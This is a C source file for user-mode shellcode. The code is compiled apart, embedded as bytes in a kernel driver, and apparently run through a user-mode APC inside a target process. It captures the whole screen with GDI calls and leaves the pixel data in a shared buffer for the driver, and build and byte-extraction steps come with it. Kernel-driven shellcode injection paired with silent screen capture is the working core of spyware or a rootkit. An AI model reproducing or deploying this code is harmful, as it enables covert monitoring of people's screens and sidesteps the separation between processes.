//
// ShellcodeGdi.c
//
// User-mode GDI screen capture shellcode.  Compiled SEPARATELY from the
// driver, then the .text section bytes are embedded in the driver as a
// constant array (ShellcodeGdiBytes.h).
//
// The kernel pre-resolves all Win32 function addresses and writes them
// into the SC_PARAMS block; the shellcode merely calls through those
// pointers, so it needs no PEB-walking / PE-parsing of its own.
//
// -----------------------------------------------------------------------
// Build (x64 MSVC, Developer Command Prompt):
//
//   cl /c /O1 /GS- /Zl /Oi /W3 ShellcodeGdi.c
//
// Extract .text bytes (option A - dumpbin):
//
//   dumpbin /section:.text /rawdata:bytes ShellcodeGdi.obj
//
// Extract .text bytes (option B - PowerShell, produces C array):
//
//   $bytes = [IO.File]::ReadAllBytes("ShellcodeGdi.obj")
//   # COFF: section header starts at 0x14 + sizeof optional header
//   # For /Zl obj the optional header size is 0, so first section header
//   # at offset 0x3C (after FILE_HEADER + alignment).  Use dumpbin for
//   # the exact raw-data offset, then:
//   # $raw = $bytes[<rawOffset>..(<rawOffset>+<rawSize>-1)]
//   # ($raw | ForEach-Object { "0x{0:X2}" -f $_ }) -join ", "
//
// Then paste the byte array into ShellcodeGdiBytes.h.
// -----------------------------------------------------------------------
//
// Rules for position-independent code:
//   - No global / static variables
//   - No string literals
//   - No CRT calls (memset, memcpy, ...)
//   - _InterlockedExchange is an intrinsic with /Oi
//   - All structs live on the stack
//   - x64 code is naturally RIP-relative => PIC
//

// ---- Minimal type defs (avoid pulling in CRT / Windows.h) ----

typedef unsigned __int64 ULONG64;
typedef unsigned long    DWORD;
typedef unsigned short   WORD;
typedef int              BOOL;
typedef long             LONG;
typedef void*            PVOID;
typedef void*            HANDLE;
typedef void*            HDC;
typedef void*            HBITMAP;
typedef void*            HGDIOBJ;
typedef unsigned char    BYTE;

// ---- SC_PARAMS: MUST match ScreenShot.c layout EXACTLY ----

typedef struct {
    ULONG64  pfnGetDC;                  // +0x00  user32
    ULONG64  pfnReleaseDC;              // +0x08
    ULONG64  pfnCreateCompatibleDC;     // +0x10  gdi32(full)
    ULONG64  pfnDeleteDC;              // +0x18
    ULONG64  pfnCreateCompatibleBitmap; // +0x20
    ULONG64  pfnSelectObject;           // +0x28
    ULONG64  pfnBitBlt;                 // +0x30
    ULONG64  pfnGetDIBits;              // +0x38
    ULONG64  pfnDeleteObject;           // +0x40
    ULONG64  pfnGetSystemMetrics;       // +0x48  user32
    DWORD    Width;                     // +0x50
    DWORD    Height;                    // +0x54
    DWORD    Stride;                    // +0x58
    DWORD    FrameSize;                 // +0x5C
    volatile LONG Ready;                // +0x60
    volatile LONG Status;               // +0x64
    BYTE     Pixels[1];                 // +0x68  BGRA frame data
} SC_PARAMS;

// ---- Function pointer typedefs ----

typedef HDC     (__stdcall *FN_GetDC)(HANDLE);
typedef int     (__stdcall *FN_ReleaseDC)(HANDLE, HDC);
typedef HDC     (__stdcall *FN_CreateCompatibleDC)(HDC);
typedef BOOL    (__stdcall *FN_DeleteDC)(HDC);
typedef HBITMAP (__stdcall *FN_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ (__stdcall *FN_SelectObject)(HDC, HGDIOBJ);
typedef BOOL    (__stdcall *FN_BitBlt)(HDC, int, int, int, int,
                                       HDC, int, int, DWORD);
typedef int     (__stdcall *FN_GetDIBits)(HDC, HBITMAP, DWORD, DWORD,
                                          PVOID, PVOID, DWORD);
typedef BOOL    (__stdcall *FN_DeleteObject)(HGDIOBJ);
typedef int     (__stdcall *FN_GetSystemMetrics)(int);

// ---- Stack-local BITMAPINFOHEADER (40 bytes, no padding) ----

#pragma pack(push, 1)
typedef struct {
    DWORD biSize;           // 40
    LONG  biWidth;
    LONG  biHeight;         // negative = top-down
    WORD  biPlanes;         // 1
    WORD  biBitCount;       // 32
    DWORD biCompression;    // 0 = BI_RGB
    DWORD biSizeImage;
    LONG  biXPelsPerMeter;
    LONG  biYPelsPerMeter;
    DWORD biClrUsed;
    DWORD biClrImportant;
} BITMAPINFOHEADER_SC;
#pragma pack(pop)

// ---- Entry point (user-mode APC normal routine) ----
// Signature: void (PVOID NormalContext, PVOID SA1, PVOID SA2)

__declspec(noinline)
void __stdcall ShellcodeEntry(SC_PARAMS* p, PVOID sa1, PVOID sa2)
{
    (void)sa1;
    (void)sa2;

    FN_GetSystemMetrics       pGetSM   = (FN_GetSystemMetrics)      p->pfnGetSystemMetrics;
    FN_GetDC                  pGetDC   = (FN_GetDC)                 p->pfnGetDC;
    FN_ReleaseDC              pRelDC   = (FN_ReleaseDC)             p->pfnReleaseDC;
    FN_CreateCompatibleDC     pCrDC    = (FN_CreateCompatibleDC)    p->pfnCreateCompatibleDC;
    FN_DeleteDC               pDelDC   = (FN_DeleteDC)              p->pfnDeleteDC;
    FN_CreateCompatibleBitmap pCrBmp   = (FN_CreateCompatibleBitmap)p->pfnCreateCompatibleBitmap;
    FN_SelectObject           pSelObj  = (FN_SelectObject)          p->pfnSelectObject;
    FN_BitBlt                 pBlt     = (FN_BitBlt)                p->pfnBitBlt;
    FN_GetDIBits              pGetDIB  = (FN_GetDIBits)             p->pfnGetDIBits;
    FN_DeleteObject           pDelObj  = (FN_DeleteObject)          p->pfnDeleteObject;

    int cx = pGetSM(0);  // SM_CXSCREEN
    int cy = pGetSM(1);  // SM_CYSCREEN

    if (cx <= 0 || cy <= 0 || (DWORD)cx * (DWORD)cy > 3840u * 2160u) {
        p->Status = 1;
        _InterlockedExchange(&p->Ready, 1);
        return;
    }

    HDC hdcScreen = pGetDC(0);
    if (!hdcScreen) {
        p->Status = 2;
        _InterlockedExchange(&p->Ready, 1);
        return;
    }

    HDC     hdcMem = pCrDC(hdcScreen);
    HBITMAP hBmp   = pCrBmp(hdcScreen, cx, cy);
    HGDIOBJ hOld   = pSelObj(hdcMem, (HGDIOBJ)hBmp);

    pBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, 0x00CC0020u /* SRCCOPY */);

    // Zero BITMAPINFOHEADER on stack (no memset available)
    BITMAPINFOHEADER_SC bih;
    {
        BYTE* bp = (BYTE*)&bih;
        int i;
        for (i = 0; i < (int)sizeof(bih); i++) bp[i] = 0;
    }
    bih.biSize     = 40;
    bih.biWidth    = cx;
    bih.biHeight   = -cy;   // top-down
    bih.biPlanes   = 1;
    bih.biBitCount = 32;    // BGRA

    pGetDIB(hdcMem, hBmp, 0, (DWORD)cy, p->Pixels, (PVOID)&bih, 0 /* DIB_RGB_COLORS */);

    p->Width     = (DWORD)cx;
    p->Height    = (DWORD)cy;
    p->Stride    = (DWORD)(cx * 4);
    p->FrameSize = (DWORD)(cx * cy * 4);

    pSelObj(hdcMem, hOld);
    pDelObj((HGDIOBJ)hBmp);
    pDelDC(hdcMem);
    pRelDC(0, hdcScreen);

    p->Status = 0;
    _InterlockedExchange(&p->Ready, 1);
}
